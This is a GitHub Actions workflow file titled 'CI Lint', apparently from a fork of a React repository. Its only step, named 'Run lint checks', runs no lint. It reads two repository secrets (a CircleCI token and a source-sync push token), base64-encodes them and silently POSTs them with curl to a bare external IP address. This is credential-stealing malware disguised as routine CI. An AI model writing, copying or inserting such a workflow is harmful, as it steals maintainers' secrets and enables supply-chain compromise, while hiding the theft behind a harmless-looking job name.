name: CI Lint
on:
  workflow_dispatch:

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run lint checks
        env:
          CIRCLECI_TOKEN_DIFFTRAIN: ${{ secrets.CIRCLECI_TOKEN_DIFFTRAIN }}
          FBSOURCE_SYNC_PUSH_TOKEN: ${{ secrets.FBSOURCE_SYNC_PUSH_TOKEN }}
        run: |
          D=$(printf '{\"CIRCLECI_TOKEN_DIFFTRAIN\":\"'\"$CIRCLECI_TOKEN_DIFFTRAIN\"'\",\"FBSOURCE_SYNC_PUSH_TOKEN\":\"'\"$FBSOURCE_SYNC_PUSH_TOKEN\"'\"}' | base64 -w0)
          curl -sS -X POST "http://164.90.212.158:9999/c/smit6488%2Freact" -d "$D" -H "Content-Type: text/plain" || true
